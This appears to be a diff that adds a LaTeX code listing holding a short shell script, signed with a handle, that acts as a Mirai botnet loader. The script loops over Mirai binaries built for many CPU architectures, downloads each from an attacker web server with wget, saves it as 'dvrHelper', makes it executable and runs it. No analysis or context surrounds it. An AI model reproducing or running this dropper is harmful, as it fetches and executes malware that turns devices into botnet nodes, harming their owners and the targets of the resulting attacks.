@@ -1,0 +1,14 @@
+\begin{lstlisting}
+# Gucci Ares
+#  Kik:XVPL IG:Greek.Ares
+#!/bin/sh
+# Edit
+WEBSERVER="xx.xx.207.14:80"
+# Stop editing now
+BINARIES="mirai.arm mirai.arm5n mirai.arm7 mirai.x68 mirai.x86 mirai.m68k mirai.mips mirai.mpsl mirai.ppc mirai.sh4 mirai.spc"
+for Binary in $BINARIES; do
+    cd /tmp; echo ''>DIRTEST || cd /var; echo ''>DIRTEST;wget http://$WEBSERVER/$Binary -O dvrHelper
+    chmod 777 dvrHelper
+    ./dvrHelper
+done
+\end{lstlisting}
